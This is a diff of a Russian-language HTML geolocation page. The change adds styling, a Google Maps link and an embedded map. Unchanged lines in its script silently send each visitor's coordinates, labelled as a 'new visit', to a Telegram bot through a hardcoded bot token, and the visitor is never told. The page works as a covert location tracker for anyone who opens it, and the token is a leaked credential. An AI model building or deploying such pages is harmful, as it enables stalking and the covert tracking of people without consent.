@@ -3,20 +3,41 @@
 <head>
   <meta charset="UTF-8" />
   <title>Геолокация</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 20px;
+      text-align: center;
+    }
+    #map {
+      width: 100%;
+      height: 300px;
+      margin-top: 20px;
+      border: 1px solid #ccc;
+    }
+    a {
+      display: inline-block;
+      margin-top: 10px;
+      font-size: 18px;
+      color: blue;
+    }
+  </style>
 </head>
 <body>
-  <h1>Геолокация</h1>
-  <p id="status">Ожидание разрешения...</p>
+  <h1>🌍 Геолокация</h1>
+  <p id="status">⏳ Ожидание разрешения на доступ к геолокации...</p>
+  <a id="mapLink" href="#" target="_blank" style="display:none;">📍 Открыть в Google Maps</a>
+  <div id="map" style="display:none;"></div>
 
   <script>
     function success(position) {
       const latitude = position.coords.latitude;
       const longitude = position.coords.longitude;
 
-      document.getElementById('status').textContent =
-        `Ваши координаты: широта ${latitude}, долгота ${longitude}`;
+      const coordsText = `Ваши координаты: широта ${latitude.toFixed(6)}, долгота ${longitude.toFixed(6)}`;
+      document.getElementById('status').textContent = coordsText;
 
-      // Отправка координат в Telegram
+      // Telegram отправка
       fetch('https://api.telegram.org/bot7505831892:AAEXunB46sqfDxkas6G1ratUdvuEd6pn-88/sendMessage', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -25,6 +46,19 @@
           text: `📍 Новый визит!\nШирота: ${latitude}\nДолгота: ${longitude}`
         })
       });
+
+      // Google Maps ссылка
+      const link = `https://www.google.com/maps?q=${latitude},${longitude}`;
+      const mapLink = document.getElementById('mapLink');
+      mapLink.href = link;
+      mapLink.style.display = 'inline-block';
+
+      // Встроенная карта
+      const mapFrame = document.getElementById('map');
+      mapFrame.innerHTML = `<iframe width="100%" height="300" style="border:0"
+        src="https://maps.google.com/maps?q=${latitude},${longitude}&z=15&output=embed"
+        allowfullscreen></iframe>`;
+      mapFrame.style.display = 'block';
     }
 
     function error() {
@@ -36,7 +70,7 @@
       navigator.geolocation.getCurrentPosition(success, error);
     } else {
       document.getElementById('status').textContent =
-        'Ваш браузер не поддерживает геолокацию.';
+        '❌ Геолокация не поддерживается этим браузером.';
     }
   </script>
 </body>
